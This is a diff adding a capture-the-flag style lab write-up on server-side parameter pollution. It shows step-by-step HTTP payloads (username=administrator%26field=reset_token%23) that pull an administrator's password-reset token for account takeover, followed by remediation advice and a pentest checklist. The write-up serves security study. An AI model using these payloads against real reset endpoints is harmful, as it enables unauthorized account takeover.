@@ -232,5 +232,86 @@ POST /api/checkout HTTP/1.1 Host: <LAB_HOST> Cookie: session=<SESSION> Content-T
 
 ---
 
+# Server-side Parameter Pollution (SSPP) — Lab-4: Exploiting injected query params to retrieve reset token & reset admin password
+
 ---
 
+## 🔹 One-line summary
+Exploited server-side parameter pollution by injecting encoded URL syntax into a public parameter to force the server’s internal API to accept field=email → field=reset_token, obtained a reset token, reset admin password and completed the admin takeover (PoC attached).
+
+---
+
+## 🔹 Overview
+Server-side Parameter Pollution (SSPP) occurs when user-controlled input (query string, form fields) is embedded verbatim into a server → internal-service request. By injecting encoded characters (%26, %23, %3D) you can add, truncate or override parameters that the internal API receives — changing internal behaviour without the front-end showing anything different.
+
+---
+
+## 🔹 Methodology / Lab walkthrough (precise steps)
+1. *Locate endpoint* — find the public endpoint that the app forwards to an internal API (example: POST /forgot-password).  
+2. *Capture baseline request* — use Burp Proxy to capture POST /forgot-password and confirm normal responses for invalid usernames.  
+3. *Quick injection test* — send username=administrator%26x=1 to check if additional params reach the internal API (different error messages indicate reachability).  
+4. *Truncation test* — send username=administrator%23 to observe truncation behaviour; note changed response messages.  
+5. *Combine add + truncate to probe internal param name* — send username=administrator%26field=§x§%23 and brute-force §x§ (Intruder) with candidate values (email, reset_token, id, token, etc.).  
+6. *Identify valid field value* — when field=email produces a success-like response or expected behavior, you’ve found a valid field parameter mapping.  
+7. *Request token* — replace field=email with field=reset_token (or the discovered value that returns a token). Example: username=administrator%26field=reset_token%23 — send and capture returned token.  
+8. *Use token to reset password* — follow the reset URL/process (e.g., /forgot-password?reset_token=<token>) and set a new password for administrator.  
+9. *Login as admin & verify* — authenticate with new credentials and perform the required lab action (e.g., delete carlos) to mark lab solved.
+
+---
+
+## 🔹 Repeater-ready payload examples (copy / paste & edit)
+*Probe for add+truncate (Intruder candidate position):*
+POST /forgot-password HTTP/1.1 Host: <LAB_HOST> Content-Type: application/x-www-form-urlencoded Cookie: session=<SESSION>
+
+username=administrator%26field=§x§%23
+*Direct test (found field = email):*
+POST /forgot-password HTTP/1.1 Host: <LAB_HOST> Content-Type: application/x-www-form-urlencoded Cookie: session=<SESSION>
+
+username=administrator%26field=email%23
+*Request token (found field = reset_token):*
+POST /forgot-password HTTP/1.1 Host: <LAB_HOST> Content-Type: application/x-www-form-urlencoded Cookie: session=<SESSION>
+
+username=administrator%26field=reset_token%23
+*Follow-up (reset password using token — example GET):*
+GET /forgot-password?reset_token=<TOKEN> HTTP/1.1 Host: <LAB_HOST> Cookie: session=<SESSION>
+(URL-encode & as %26 and # as %23 so the characters reach the server-side concatenation layer.)
+
+---
+
+## 🔹 Proof (evidence)
+1. *Found field parameter (field=email) via Intruder / responses*  
+   ![SSPP — found field parameter (field=email) via Intruder/responses](../images/sspp-field-found.png)
+
+2. *Replaced field with reset_token and captured the returned token*  
+   ![SSPP — replaced field with reset_token and received token in response](../images/sspp-reset-token.png)
+
+3. *Final lab solved — admin reset/login/delete carlos (UI / response proof)*  
+   ![SSPP — lab solved (admin takeover / delete carlos confirmation)](../images/sspp-lab-solved.png)
+
+---
+
+## 🔹 Impact
+- Token disclosure / account takeover (password resets) → full admin compromise.  
+- Internal API actions triggered without proper validation → data theft, privilege escalation, destructive actions.  
+- SSPP can transform harmless public inputs into privileged internal requests.
+
+---
+
+## 🔹 Remediation (short)
+- *Canonicalize & escape* user input before embedding into internal request strings.  
+- *Avoid string concatenation* for internal requests — use structured parameter maps / builders.  
+- *Validate & whitelist* allowed parameter names/values on the internal API (deny unknown params).  
+- *Reject/encode* raw &, #, = in fields that will be forwarded or treat values as opaque.  
+- *Log & monitor* suspicious encoded inputs (%26, %23) and alert on patterns that look like SSPP probing.
+
+---
+
+## 🔹 Pentest checklist (copyable)
+- [ ] Identify endpoints that proxy/forward user input server → internal API (forgot-password, search, stock-check).  
+- [ ] Capture a baseline request & response for invalid/valid inputs.  
+- [ ] Test add (%26), truncate (%23), and override payloads and observe response differences.  
+- [ ] Use Intruder to brute-force candidate field values when internal param name unknown.  
+- [ ] When token/data retrieved, follow reset/flow to confirm takeover and document PoC.  
+- [ ] Report exact payloads, raw requests/responses and remediation advice.
+
+---
